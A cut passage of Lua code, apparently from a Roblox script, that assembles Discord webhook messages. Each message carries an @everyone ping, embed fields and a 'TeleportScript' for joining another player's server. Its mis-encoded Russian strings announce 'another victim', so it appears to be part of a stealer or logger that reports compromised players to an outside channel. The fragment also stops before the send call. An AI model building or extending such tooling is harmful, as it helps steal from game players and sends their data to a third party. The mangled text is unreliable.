        ["Content-Type"] = "application/json"
    }
    
    -- –§–æ—Ä–º–∏—Ä—É–µ–º –∫–æ–Ω—Ç–µ–Ω—Ç —Å —Ç–µ–ª–µ–ø–æ—Ä—Ç–æ–º –≤ —Å—Ç–∏–ª–µ –ø–µ—Ä–≤–æ–≥–æ –∫–æ–¥–∞
    local teleportContent = "üéØ **–í–¨–ï–ë–ê–ù** –û—á–µ—Ä–µ–¥–Ω–æ–π –∫—É–∫–∏—á:\n\n" .. TeleportScript
    
    local data = {
        ["username"] = "Aliwave 2.0",
        ["avatar_url"] = "https://i.pinimg.com/1200x/b9/dc/87/b9dc8716aed2277f22643c0d87f6169f.jpg",
        ["content"] = teleportContent,
        ["embeds"] = {
            {
                ["title"] = embed.title,
                ["color"] = embed.color,
                ["fields"] = embed.fields,
                ["footer"] = {
                    ["text"] = "A.T via 2025! Alwaez - —Å—ã–Ω –∫–æ—Ä–æ–ª—è!"
                }
            }
        }
    }
    
    local data2 = {
        ["username"] = "Aliwave 2.0", 
        ["avatar_url"] = "https://i.pinimg.com/1200x/b9/dc/87/b9dc8716aed2277f22643c0d87f6169f.jpg", 
        ["content"] = "-- @everyone\n" .. teleportContent,
        ["embeds"] = {
            {
                ["title"] = embed.title,
                ["color"] = embed.color,
                ["fields"] = embed.fields,
                ["footer"] = {
                    ["text"] = "A.T via 2025! Alwaez - —Å—ã–Ω –∫–æ—Ä–æ–ª—è!"
                }
            }
        }
    }
    
    local body = http:JSONEncode(data)
